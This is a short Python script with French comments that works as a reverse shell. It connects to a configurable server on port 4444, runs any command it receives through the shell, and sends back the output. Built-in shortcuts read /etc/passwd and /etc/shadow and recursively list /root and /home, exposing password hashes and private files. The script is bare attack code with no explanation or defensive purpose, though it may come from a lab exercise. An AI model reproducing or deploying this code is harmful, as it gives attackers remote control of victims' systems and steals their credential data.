import socket
import subprocess
import os

SERVER_IP = "127.0.0.1" # À changer par l'IP du serveur si besoin
SERVER_PORT = 4444

def execute_cmd(cmd):
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return res.stdout + res.stderr
    except Exception as e:
        return str(e)

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((SERVER_IP, SERVER_PORT))
        sock.send(f"{socket.gethostname()} - Linux".encode())
    except Exception as e:
        print(f"Erreur de connexion : {e}")
        return

    while True:
        cmd = sock.recv(4096).decode("utf-8").strip()
        if not cmd or cmd == "exit":
            break
        
        if cmd == "passwd":
            resultat = execute_cmd("cat /etc/passwd")
        elif cmd == "shadow":
            resultat = execute_cmd("cat /etc/shadow")
        elif cmd == "list_root":
            resultat = execute_cmd("ls -laR /root")
        elif cmd == "list_home":
            resultat = execute_cmd("ls -laR /home")
        else:
            resultat = execute_cmd(cmd)
            
        sock.send(resultat.encode())

    sock.close()

if __name__ == "__main__":
    main()